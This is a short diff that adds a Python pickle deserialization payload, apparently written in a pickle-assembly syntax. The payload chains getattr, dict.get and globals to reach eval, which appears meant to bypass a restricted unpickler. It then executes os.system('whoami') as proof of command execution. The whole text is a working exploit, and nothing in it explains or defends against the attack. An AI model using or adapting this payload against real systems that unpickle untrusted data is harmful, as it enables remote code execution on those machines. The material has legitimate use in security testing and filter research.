@@ -1,0 +1,9 @@
+getattr = GLOBAL('builtins', 'getattr')
+dict = GLOBAL('builtins', 'dict')
+dict_get = getattr(dict, 'get')
+globals = GLOBAL('builtins', 'globals')
+builtins = globals()
+__builtins__ = dict_get(builtins, '__builtins__')
+eval = getattr(__builtins__, 'eval')
+eval('__import__("os").system("whoami")')
+return
